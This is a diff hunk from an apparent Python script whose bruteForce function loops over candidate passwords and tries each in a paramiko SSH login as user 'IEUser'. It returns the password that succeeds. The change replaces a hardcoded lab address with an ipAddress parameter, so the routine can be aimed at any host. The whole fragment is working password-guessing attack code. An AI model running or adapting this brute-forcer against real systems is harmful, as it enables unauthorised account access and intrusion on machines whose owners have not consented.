@@ -23,7 +23,7 @@ def bruteForce(user, ipAddress):
         secret=i.strip("\n")
         try:
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect('192.168.0.60', username="IEUser", password=secret)
+            ssh.connect(ipAddress, username="IEUser", password=secret)
             return secret
 
         except:
